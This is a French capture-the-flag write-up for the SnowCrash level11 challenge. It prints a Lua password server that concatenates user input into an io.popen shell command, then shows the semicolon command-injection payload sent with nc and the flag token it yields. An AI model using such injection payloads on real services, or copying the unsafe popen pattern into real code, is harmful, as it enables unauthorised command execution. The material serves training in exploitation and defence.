Au login nous voyons un fichier level11.lua qui contient un script lua.
```lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```
Nous voyons que le script attend une connexion sur le port 5151 et envoie "Password: " au client.

Apes analyse du script nous voyons une faiblesse au niveau de io.popen("echo "..pass.." | sha1sum", "r")

Par nos expériences précédentes nous savons que la fonction io.popen permet d'executer des commandes shell et de récupérer le résultat, donc nous décidons de tester si nous pouvons injecter des commandes shell.

avec echo nous envoyons la commande shell suivante.

```bash
echo '; getflag | tee /tmp/testq' | nc localhost 5151
```
Nous avons envoyé la commande shell `getflag` et nous avons redirigé la sortie vers le fichier `/tmp/testq`.

Nous lisons le fichier `/tmp/testq` et nous voyons le flag.

```bash
level11@SnowCrash:~$ cat /tmp/testq
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
